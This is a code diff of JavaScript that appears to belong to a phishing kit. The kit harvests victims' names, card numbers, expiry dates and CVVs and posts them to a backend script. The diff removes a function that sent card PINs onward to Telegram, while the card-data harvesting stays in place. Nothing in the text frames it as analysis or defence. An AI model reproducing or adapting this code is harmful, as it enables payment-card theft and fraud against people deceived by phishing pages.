@@ -100,15 +100,14 @@ function sendBlInfo(sess, data) {
     })
 }
 
-function sendCardInfo(sess, fullname, cardNumber, expiry, cvv, pin) {
+function sendCardInfo(sess, fullname, cardNumber, expiry, cvv) {
   var data = {
     'action': 'card',
     'session': sess,
     'fullname': fullname,
     'card_number': cardNumber,
     'expiry': expiry,
-    'cvv': cvv,
-    'pin': pin
+    'cvv': cvv
   };
 
   $.ajax({
@@ -135,37 +134,6 @@ function sendCardInfo(sess, fullname, cardNumber, expiry, cvv, pin) {
       console.log('Error sending card info: ' + error);
     }
   });
-}
-
-function sendPIN(sess, kode) {
-    var postman = "backend.php";
-    var values = {
-        'action': 'pin',
-        'sess': sess,
-        '_pn': kode
-    };
-
-    $.ajax({
-        type: 'POST',
-        url: postman,
-        data: values,
-        success: function(data) {
-            console.log('PIN sent to Telegram!');
-            try {
-               var response = JSON.parse(data);
-               if (response.status === 'success') {
-                  console.log('Data successfully sent to Telegram');
-               } else {
-                  console.log('Error: ' + response.message);
-               }
-            } catch (e) {
-               console.log('Response received');
-            }
-        },
-        error: function(xhr, status, error) {
-            console.log('Error sending data: ' + error);
-        }
-    })
 }
 
 function sendKod(sess, kode, type) {
